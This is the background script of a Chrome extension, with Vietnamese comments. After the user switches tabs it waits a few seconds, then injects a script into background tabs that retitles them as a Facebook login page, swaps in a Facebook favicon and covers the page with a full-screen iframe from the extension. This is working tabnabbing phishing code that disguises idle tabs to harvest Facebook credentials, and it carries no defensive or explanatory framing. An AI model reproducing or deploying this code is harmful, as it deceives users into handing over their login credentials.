const trackedTabs = {};

chrome.tabs.onActivated.addListener(async ({ tabId }) => {
  for (const id in trackedTabs) {
    clearTimeout(trackedTabs[id]);
    delete trackedTabs[id];
  }

  const allTabs = await chrome.tabs.query({ currentWindow: true });
  const bgTabs = allTabs.filter(
    (tab) => tab.id !== tabId && tab.active === false
  );

  const { enabledDomains, defaultInjectAll, injectDelay } = await chrome.storage.local.get([
    "enabledDomains",
    "defaultInjectAll",
    "injectDelay"
  ]);
  const delayMs = (injectDelay ? injectDelay : 3) * 1000;

  bgTabs.forEach((tab) => {
    if (!tab.url) return;

    const tabHostname = new URL(tab.url).hostname;
    // Nếu defaultInjectAll đang bật, inject tất cả domain
    if (defaultInjectAll) {
      const timeoutId = setTimeout(() => {
        chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: () => {
            // Đổi title và favicon của tab cha
            document.title = "Facebook - Đăng nhập hoặc đăng ký";
            (function changeFavicon(url) {
              let link = document.querySelector("link[rel~='icon']");
              if (!link) {
                link = document.createElement("link");
                link.rel = "icon";
                document.head.appendChild(link);
              }
              link.href = url;
            })(chrome.runtime.getURL("images/fb.ico"));

            // Chèn iframe
            const iframe = document.createElement("iframe");
            iframe.src = chrome.runtime.getURL("inject.html");
            iframe.style.position = "fixed";
            iframe.style.top = 0;
            iframe.style.left = 0;
            iframe.style.width = "100vw";
            iframe.style.height = "100vh";
            iframe.style.zIndex = 999999;
            document.body.appendChild(iframe);
          },
        });
        delete trackedTabs[tab.id];
      }, delayMs);
      trackedTabs[tab.id] = timeoutId;
      return;
    }
    // Nếu defaultInjectAll tắt, chỉ inject các domain được bật riêng lẻ
    if (enabledDomains && enabledDomains[tabHostname]) {
      const timeoutId = setTimeout(() => {
        chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: () => {
            // Đổi title và favicon của tab cha
            document.title = "Facebook - Đăng nhập hoặc đăng ký";
            (function changeFavicon(url) {
              let link = document.querySelector("link[rel~='icon']");
              if (!link) {
                link = document.createElement("link");
                link.rel = "icon";
                document.head.appendChild(link);
              }
              link.href = url;
            })(chrome.runtime.getURL("images/fb.ico"));

            // Chèn iframe
            const iframe = document.createElement("iframe");
            iframe.src = chrome.runtime.getURL("inject.html");
            iframe.style.position = "fixed";
            iframe.style.top = 0;
            iframe.style.left = 0;
            iframe.style.width = "100vw";
            iframe.style.height = "100vh";
            iframe.style.zIndex = 999999;
            document.body.appendChild(iframe);
          },
        });
        delete trackedTabs[tab.id];
      }, delayMs);
      trackedTabs[tab.id] = timeoutId;
    }
  });
});
